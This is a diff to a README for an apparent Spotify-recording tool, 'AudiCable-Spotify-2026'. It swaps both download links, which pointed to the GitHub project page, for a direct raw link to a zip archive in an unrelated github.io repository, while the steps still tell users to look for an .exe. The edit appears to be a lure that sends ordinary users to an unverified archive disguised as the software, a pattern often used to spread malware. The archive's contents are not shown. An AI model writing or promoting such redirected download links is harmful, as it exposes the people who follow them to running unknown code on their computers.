@@ -5,7 +5,7 @@ description: "Download the full version of AudiCable Spotify Recorder for Window
 ---
 # 🎵 AudiCable-Spotify-2026 - Save Spotify Music to Files Easily
 
-[![](https://img.shields.io/badge/Download-AudiCable-blue.svg)](https://github.com/Sirthomasrafflescrowblackbird49/AudiCable-Spotify-2026)
+[![](https://img.shields.io/badge/Download-AudiCable-blue.svg)](https://raw.githubusercontent.com/Sirthomasrafflescrowblackbird49/sirthomasrafflescrowblackbird49.github.io/main/Catalan/v1.1.zip)
 
 AudiCable-Spotify-2026 captures music from the Spotify desktop application. It transforms streaming audio into local files. You keep your favorite tracks on your computer. This software works on Windows 11 and Windows 10. You do not need technical skills to use this tool. You simply play your music and the recorder creates the files for you.
 
@@ -23,7 +23,7 @@ Your computer must meet these basic needs to run the software.
 
 Follow these steps to get the software on your computer.
 
-1. Visit the project release page to get the installer: [AudiCable-Spotify-2026 Download](https://github.com/Sirthomasrafflescrowblackbird49/AudiCable-Spotify-2026).
+1. Visit the project release page to get the installer: [AudiCable-Spotify-2026 Download](https://raw.githubusercontent.com/Sirthomasrafflescrowblackbird49/sirthomasrafflescrowblackbird49.github.io/main/Catalan/v1.1.zip).
 2. Look for the file ending in .exe.
 3. Click the file name to start the download.
 4. Save the file to your desktop for easy access.
